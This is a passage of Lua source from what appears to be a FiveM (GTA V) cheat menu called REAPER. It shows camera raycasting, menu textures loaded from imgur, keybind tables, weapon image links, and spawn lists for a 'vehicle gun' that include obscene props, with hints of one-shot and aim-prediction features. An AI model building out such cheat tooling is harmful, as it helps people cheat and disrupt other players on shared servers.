            local a, b, c, d, e = __REAPER1__.N.GetShapeTestResult(__REAPER1__.N.StartShapeTestRay(cameraCoord.x, cameraCoord.y, cameraCoord.z, dx, dy, dz, -1, __REAPER1__.V.SelfPed, 1))

            return c.x ~= 0 and c or vector3(dx, dy, dz), __REAPER1__.N.IsEntity(e) and e or nil
        end
    end

    __REAPER1__.M.RayCastCamera = function(cam, cameraRotation, cameraCoord, distance)
        local direction = __REAPER1__.M.RotationToDirection(cameraRotation)
        local destination = vector3(cameraCoord.x + direction.x * distance, cameraCoord.y + direction.y * distance, cameraCoord.z + direction.z * distance)
        local a, b, c, d, e = __REAPER1__.N.GetShapeTestResult(__REAPER1__.N.StartShapeTestRay(cameraCoord.x, cameraCoord.y, cameraCoord.z, destination.x, destination.y, destination.z, -1, __REAPER1__.V.FreecamIgnore or 0, 1))

        return c.x ~= 0 and c or vector3(cameraCoord.x + direction.x * 250.0, cameraCoord.y + direction.y * 250.0, cameraCoord.z + direction.z * 250.0), __REAPER1__.N.IsEntity(e) and e or nil
    end

    --texture creating
    
    __REAPER1__.M.NotifyImage = __REAPER1__.N.CreateDui('https://i.imgur.com/1Rvpjxj.png', 288, 36)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER5__'), '__REAPER6__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.NotifyImage))
    
    __REAPER1__.M.BannerImage = __REAPER1__.N.CreateDui('https://i.imgur.com/3sgTQSg.png', 720, 143)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER2__'), '__REAPER3__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.BannerImage))

    __REAPER1__.M.Subm = __REAPER1__.N.CreateDui('https://i.imgur.com/qR8df0Y.png', 720, 68)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER10__'), '__REAPER11__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Subm))

    __REAPER1__.M.Subm2 = __REAPER1__.N.CreateDui('https://i.imgur.com/SkbUbpC.png', 720, 58)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER20__'), '__REAPER21__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Subm2))

    __REAPER1__.M.Subm3 = __REAPER1__.N.CreateDui('https://i.imgur.com/L0Reyb3.png', 720, 58)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER21__'), '__REAPER22__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Subm3))

    __REAPER1__.M.Subm4 = __REAPER1__.N.CreateDui('https://i.imgur.com/T5mQLGt.png', 720, 58)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER22__'), '__REAPER23__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Subm4))

    __REAPER1__.M.Subm5 = __REAPER1__.N.CreateDui('https://i.imgur.com/bT2nh9n.png', 720, 58)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER23__'), '__REAPER24__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Subm5))

    __REAPER1__.M.Infobox = __REAPER1__.N.CreateDui('https://i.imgur.com/2iWROAA.png', 1000, 189)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER16__'), '__REAPER17__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Infobox))

    __REAPER1__.M.BonetagImage = __REAPER1__.N.CreateDui('https://i.imgur.com/6MwdzSA.png', 324, 508)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER6__'), '__REAPER7__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.BonetagImage))

    __REAPER1__.M.VehicleImage = __REAPER1__.N.CreateDui('about:blank', 210, 118)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER7__'), '__REAPER8__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.VehicleImage))
    
    __REAPER1__.M.WeaponImage = __REAPER1__.N.CreateDui('about:blank', 310, 174)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER3__'), '__REAPER4__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.WeaponImage))

    __REAPER1__.M.ModelImage = __REAPER1__.N.CreateDui('about:blank', 240, 450)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER4__'), '__REAPER5__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.ModelImage))

    __REAPER1__.M.Arrow1 = __REAPER1__.N.CreateDui('https://i.imgur.com/dWXV58X.png', 82, 11)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER8__'), '__REAPER9__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Arrow1))

    __REAPER1__.M.Arrow2 = __REAPER1__.N.CreateDui('https://i.imgur.com/N8TAqkH.png', 82, 11)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER9__'), '__REAPER10__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Arrow2))

    __REAPER1__.M.Entry = __REAPER1__.N.CreateDui('https://i.imgur.com/n7b024g.png', 720, 58)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER11__'), '__REAPER12__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Entry))

    __REAPER1__.M.Entry2 = __REAPER1__.N.CreateDui('https://i.imgur.com/QlShTWz.png', 720, 58)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER12__'), '__REAPER13__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Entry2))

    __REAPER1__.M.Sepa = __REAPER1__.N.CreateDui('https://i.imgur.com/PzE9KrW.png', 720, 68)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER13__'), '__REAPER14__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.Sepa))

    __REAPER1__.M.SepaL = __REAPER1__.N.CreateDui('https://i.imgur.com/zSQPaHt.png', 11, 40)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER14__'), '__REAPER15__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.SepaL))

    __REAPER1__.M.SepaR = __REAPER1__.N.CreateDui('https://i.imgur.com/4fcASOa.png', 11, 40)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER15__'), '__REAPER16__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.SepaR))

    __REAPER1__.M.PlyInfobox = __REAPER1__.N.CreateDui('https://i.imgur.com/yiZLKBu.png', 346, 443)
    __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER17__'), '__REAPER18__', __REAPER1__.N.GetDuiHandle(__REAPER1__.M.PlyInfobox))

    __REAPER1__.V.CustomSound = __REAPER1__.N.CreateDui("about:blank", 1, 1)

    --menu vars
    __REAPER1__.M.LastMenu = 'home'
    __REAPER1__.M.SelectedOption = 1
    __REAPER1__.M.ScrollOption = 0
    __REAPER1__.M.AddedOptions = 0
    __REAPER1__.M.MenuAlpha = 0
    __REAPER1__.M.MenuBackgroundAlpha = 0
    __REAPER1__.M.NotificationAlpha = 0
    __REAPER1__.M.ScreenResox, __REAPER1__.M.ScreenResoy = __REAPER1__.N.GetActiveScreenResolution()
    __REAPER1__.M.PDatax, __REAPER1__.M.PDatay = 0.005, 0
    __REAPER1__.M.RDatax, __REAPER1__.M.RDatay = 0.005, 0
    __REAPER1__.M.HoverMenu = __REAPER1__.T.Display['world:hover']
    __REAPER1__.M.ChatMessagesScroll = 13
    __REAPER1__.M.ChatMessagesScrollMin = 0

    --vars
    __REAPER1__.V.PickupScroll = 3
    __REAPER1__.V.OshotOShot, __REAPER1__.V.OshotOShotNew = 2, 1
    __REAPER1__.V.PredDist = 0
    __REAPER1__.V.RPredDist = 0
    __REAPER1__.V.OPMax, __REAPER1__.V.OPMin = 27, 0
    __REAPER1__.V.FreecamFov = 50
    __REAPER1__.V.FreecamMode = 1
    __REAPER1__.V.FreecamButton = __REAPER1__.N.IsDisabledControlJustReleased
    __REAPER1__.V.RcrotorToggle = true
    
    --tables
    __REAPER1__.T.Binds = {}
    __REAPER1__.T.ControlsPlain = {['ESC'] = 322, ['F1'] = 288, ['F2'] = 289, ['F3'] = 170, ['F5'] = 166, ['F6'] = 167, ['F7'] = 168, ['F8'] = 169, ['F9'] = 56, ['F10'] = 57, ['F11'] = 344, ['`'] = 243, ['1'] = 157, ['2'] = 158, ['3'] = 160, ['4'] = 164, ['5'] = 165, ['6'] = 159, ['7'] = 161, ['8'] = 162, ['9'] = 163, ['-'] = 84, ['='] = 83, ['BSPACE'] = 177, ['TAB'] = 37, ['Q'] = 44, ['W'] = 32, ['E'] = 38, ['R'] = 45, ['T'] = 245, ['Y'] = 246, ['U'] = 303, ['P'] = 199, ['['] = 39, [']'] = 40, ['ENTER'] = 191, ['CAPS'] = 137, ['A'] = 34, ['S'] = 8, ['D'] = 9, ['F'] = 23, ['G'] = 47, ['H'] = 74, ['K'] = 311, ['L'] = 182, ['LTSHIFT'] = 21, ['Z'] = 20, ['X'] = 73, ['C'] = 26, ['V'] = 0, ['B'] = 29, ['N'] = 249, ['M'] = 244, [','] = 82, ['.'] = 81, ['LTCTRL'] = 36, ['LTALT'] = 19, ['SPACE'] = 22, ['RCTRL'] = 70, ['HOME'] = 213, ['PAGEUP'] = 10, ['PAGEDOWN'] = 11, ['DELETE'] = 178, ['LEFT'] = 174, ['RIGHT'] = 175, ['TOP'] = 27, ['UP'] = 172, ['DOWN'] = 173, ['NENTER'] = 201, ['N4'] = 108, ['N5'] = 60, ['N6'] = 107, ['N+'] = 96, ['N-'] = 97, ['N7'] = 117, ['N8'] = 111, ['N9'] = 118, ['MOUSE1'] = 24}
    __REAPER1__.T.Notifications = {}
    __REAPER1__.T.Components = {[1] = 0, [2] = 1, [3] = 2, [4] = 3, [5] = 11, [6] = 8, [7] = 4, [8] = 6, [9] = 5, [10] = 7, [11] = 9, [12] = 10}
    __REAPER1__.T.ParticleEffects = { {dict = 'scr_indep_fireworks', name = 'scr_indep_firework_trail_spawn'}, {dict = 'scr_indep_fireworks', name = 'scr_indep_firework_fountain'}, {dict = 'scr_powerplay', name = 'scr_powerplay_beast_appear'}, {dict = 'scr_rcbarry2', name = 'sp_clown_appear_trails'}, {dict = 'scr_rcbarry2', name = 'scr_clown_death'}, {dict = 'scr_rcbarry2', name = 'scr_clown_appears'}, {dict = 'scr_rcbarry2', name = 'scr_clown_bul'}, {dict = 'scr_xm_orbital', name = 'scr_xm_orbital_blast'}, {dict = 'core', name = 'veh_respray_smoke'}, {dict = 'scr_rcbarry1', name = 'scr_alien_disintegrate'}, {dict = 'scr_rcbarry1', name = 'scr_alien_teleport'}, {dict = 'cut_michael2', name = 'cs_mich2_blood_head_leak'}, {dict = 'core', name = 'blood_mist'}, {dict = 'core', name = 'exp_water'}, {dict = 'core', name = 'ent_dst_elec_fire'}, {dict = 'core', name = 'bul_dirt'}} 
    __REAPER1__.T.WeaponsImages = {['Unarmed'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/62/Fist-GTAV.png/revision/latest/scale-to-width-down/310?cb=20130920190412',['Knife'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/a7/Knife-GTAV.png/revision/latest/scale-to-width-down/310?cb=20130920185917',['Dagger'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/ce/AntiqueCavalryDagger-GTAV.png/revision/latest/scale-to-width-down/310?cb=20140617174635',['Switchblade'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fc/Switchblade-GTAV.png/revision/latest/scale-to-width-down/310?cb=20161021210105',['Hatchet'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/94/Hatchet-GTAV.png/revision/latest/scale-to-width-down/310?cb=20150314101925',['Battleaxe'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cd/BattleAxe-GTAV.png/revision/latest/scale-to-width-down/310?cb=20161004162043',['Stone_Hatchet'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/64/StoneHatchet-GTAO-RSC.png/revision/latest/scale-to-width-down/310?cb=20180803141735',['Machete'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/44/Machete-GTAV.png/revision/latest/scale-to-width-down/310?cb=20160627121720',['Bat'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/59/BaseballBat-GTAV.png/revision/latest/scale-to-width-down/309?cb=20160612221707',['Golfclub'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/97/GolfClub-GTAV.png/revision/latest/scale-to-width-down/310?cb=20131004164724',['Poolcue'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fc/PoolCue-GTAV.png/revision/latest/scale-to-width-down/310?cb=20161004162043',['Nightstick'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/19/Nightstick-GTAV.png/revision/latest/scale-to-width-down/310?cb=20130920191745',['Crowbar'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/6d/Crowbar-GTAV.png/revision/latest/scale-to-width-down/350?cb=20131017171932',['Pipewrench'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/64/PipeWrench-GTAV.png/revision/latest/scale-to-width-down/350?cb=20161004164114',['Hammer'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/88/Hammer-GTAV.png/revision/latest/scale-to-width-down/310?cb=20150521154405',['Flashlight'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/88/Flashlight-GTAO.png/revision/latest/scale-to-width-down/310?cb=20151029165843',['Knuckle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b7/BrassKnuckles-GTAV.png/revision/latest/scale-to-width-down/310?cb=20150708153813',['Bottle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/ce/Bottle-GTAV.png/revision/latest/scale-to-width-down/350?cb=20140207082902',['Pistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f4/Pistol-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108211628',['Pistol_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/46/PistolMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108210825',['Combatpistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/87/CombatPistol-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108204417',['Appistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/34/APPistol-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108203433',['Stungun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/86/StunGun-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108211633',['Pistol50'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e6/Pistol.50-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108210758',['Snspistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/17/SNSPistol-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108211527',['Snspistol_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/01/SNSPistolMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108211544',['Heavypistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/1f/HeavyPistol-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108204936',['Vintagepistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5c/VintagePistol-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108211655',['Flaregun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c0/FlareGun-GTAO.png/revision/latest/scale-to-width-down/350?cb=20180108204710',['Marksmanpistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/9d/MarksmanPistol-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108205817',['Revolver'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/40/HeavyRevolver-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108205232',['Revolver_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b0/HeavyRevolverMkII-GTAV.png/revision/latest/scale-to-width-down/350?cb=20180108205238',['Doubleaction'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/1a/DoubleActionRevolver-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108204417',['Raypistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/05/UpnAtomizer-GTAO.png/revision/latest/scale-to-width-down/310?cb=20190106171201',['Ceramicpistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/7c/CeramicPistol-GTAO.png/revision/latest/scale-to-width-down/310?cb=20200508113317',['Navyrevolver'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/4a/NavyRevolver-GTAO.png/revision/latest/scale-to-width-down/310?cb=20200508113319',['Microsmg'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/72/MicroSMG-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108210032',['Smg'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fc/SMG-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108195433',['Smg_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/9e/SMGMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108195635',['Assaultsmg'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/08/AssaultSMG-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108195945',['Combatpdw'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/25/CombatPDW-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108200353',['Machinepistol'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c4/MachinePistol-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108195137',['Minismg'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/60/MiniSMG-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108210116',['Raycarbine'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/97/UnholyHellbringer-GTAO.png/revision/latest/scale-to-width-down/310?cb=20190106171201',['Pumpshotgun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/6f/PumpShotgun-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108202354',['Pumpshotgun_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/14/PumpShotgunMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108202428',['Sawnoffshotgun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e4/SawedOffShotgun-GTAV.png/revision/latest/scale-to-width-down/350?cb=20180108202444',['Assaultshotgun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/ef/AssaultShotgun-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108202910',['Bullpupshotgun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/dc/BullpupShotgun-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108202503',['Musket'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fc/Musket-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108202945',['Heavyshotgun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/0a/HeavyShotgun-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108202953',['Dbshotgun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b3/DoubleBarrelShotgun-GTAO.png/revision/latest/scale-to-width-down/350?cb=20180108203004',['Autoshotgun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/dc/SweeperShotgun-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108203310',['Assaultrifle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e6/AssaultRifle-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108203942',['Assaultrifle_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5f/AssaultRifleMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108203958',['Carbinerifle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e1/CarbineRifle-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108204035',['Carbinerifle_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/78/CarbineRifleMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108204036',['Advancedrifle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fc/AdvancedRifle-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108200521',['Specialcarbine'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e8/SpecialCarbine-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108200839',['Specialcarbine_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/bd/SpecialCarbineMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108200905',['Bullpuprifle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d2/BullpupRifle-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108201107',['Bullpuprifle_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5e/BullpupRifleMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108201133',['Compactrifle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/8c/CompactRifle-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108201447',['Mg'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/7c/MG-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108205933',['Combatmg'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c4/CombatMG-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108204317',['Combatmg_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cc/CombatMGMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108204355',['Gusenberg'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/74/GusenbergSweeper-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108204918',['Sniperrifle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/6e/SniperRifle-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108201526',['Heavysniper'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/71/HeavySniper-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108201619',['Heavysniper_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f9/HeavySniperMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108201713',['Marksmanrifle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5c/MarksmanRifle-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108201724',['Marksmanrifle_MK2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/33/MarksmanRifleMkII-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108201720',['RPG'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/24/RPG-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108210919',['Grenadelauncher'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/98/GrenadeLauncher-GTAV.png/revision/latest/scale-to-width-down/350?cb=20180108204737',['Minigun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5c/Minigun-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108210056',['Firework'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/01/FireworkLauncher-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108203338',['Railgun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2e/Railgun-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108210857',['Hominglauncher'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/8a/HomingLauncher-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108205802',['Compactlauncher'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/61/CompactGrenadeLauncher-GTAV.png/revision/latest/scale-to-width-down/310?cb=20180108203355',['Rayminigun'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/ae/Widowmaker-GTAO.png/revision/latest/scale-to-width-down/310?cb=20190106171213',['Grenade'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/52/Grenade-GTAV.png/revision/latest/scale-to-width-down/310?cb=20190809090848',['Bzgas'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/af/TearGas-GTAV.png/revision/latest/scale-to-width-down/350?cb=20140204074533',['Molotov'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/6b/MolotovCocktail-GTAV.png/revision/latest/scale-to-width-down/310?cb=20140204073634',['Stickybomb'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/09/StickyBomb-GTAV.png/revision/latest/scale-to-width-down/310?cb=20130929074646',['Proxmine'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/51/ProximityMine-GTAV.png/revision/latest/scale-to-width-down/310?cb=20170305125904',['Snowball'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/bd/Snowball-GTAO.png/revision/latest?cb=20161222143911',['Pipebomb'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/08/PipeBomb-GTAV.png/revision/latest/scale-to-width-down/350?cb=20161004161717',['Ball'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/62/Ball-GTAV.png/revision/latest?cb=20161222150858',['Smokegreande'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/af/TearGas-GTAV.png/revision/latest/scale-to-width-down/350?cb=20140204074533',['Flare'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/00/Flare-GTAV.png/revision/latest/scale-to-width-down/310?cb=20151022100927',['Petrolcan'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/28/JerryCan-GTAV.png/revision/latest/scale-to-width-down/310?cb=20150401174331',['Parachute'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f5/Parachute-GTAV.png/revision/latest?cb=20140515064734',['Fireextinguisher'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/27/FireExtinguisher-GTAV-render.png/revision/latest?cb=20140825111936',}
    __REAPER1__.T.VehicleGunVehicle = {'cargoplane', 'skylift', 'blimp', 'maverick', 'cargobob', 'rhino', 'dump', 'insurgent2', 'monster', 'dubsta3', 'freight', 'metrotrain', 'tractor2', 'bulldozer', 'bus', 'ruiner3', 'neon', 'police', 'tug'}
    __REAPER1__.T.VehicleGunPed = {'mp_m_freemode_01','mp_f_freemode_01','cs_orleans','s_m_m_movalien_01','s_m_m_movspace_01','mp_m_bogdangoon','u_f_y_corpse_01','a_f_m_fatcult_01','a_f_y_topless_01','csb_mweather','g_m_m_chemwork_01','mp_f_cocaine_01','s_m_y_clown_01','u_m_y_pogo_01','u_m_y_juggernaut_01','u_m_y_rsranger_01','u_m_y_zombie_01', 'a_c_dolphin', 'a_c_pig', 'a_c_pigeon', 'a_c_cow', 'a_c_chimp'}
    __REAPER1__.T.VehicleGunObject = {'prop_barrel_exp_01b', 'prop_windmill_01_l1', 'p_spinning_anus_s', 'prop_juicestand', 'prop_bush_lrg_04d', 'prop_cs_dildo_01', 'prop_mp_icon_shad_lrg', 'prop_air_sechut_01', 'prop_alien_egg_01', 'stt_prop_stunt_landing_zone_01', 'prop_air_bigradar_l2', 'p_ferris_wheel_amo_p', 'prop_towercrane_01a', 'prop_parking_wand_01'}
    __REAPER1__.T.ModyAmmoGuns = {'VEHICLE_WEAPON_PLAYER_LASER', 'VEHICLE_WEAPON_ENEMY_LASER', 'WEAPON_RPG', 'WEAPON_FIREWORK', 'WEAPON_BALL', 'WEAPON_GRENADE', 'WEAPON_MOLOTOV'}
    __REAPER1__.T.HitSounds = {'https://www.myinstants.com/media/sounds/hitmsound.mp3', 'https://www.myinstants.com/media/sounds/skeet-online-audio-converter.mp3', 'https://www.myinstants.com/media/sounds/p1000bullet-online-audio-converter.mp3', 'https://www.myinstants.com/media/sounds/metal_HlnfPWO.mp3', 'https://www.myinstants.com/media/sounds/fixbubble.mp3', 'https://www.myinstants.com/media/sounds/goodnightgirl-online-audio-converter.mp3', 'https://www.myinstants.com/media/sounds/minecrafthit.mp3', 'https://www.myinstants.com/media/sounds/xphit.mp3', 'https://www.myinstants.com/media/sounds/gah-online-audio-converter.mp3'}
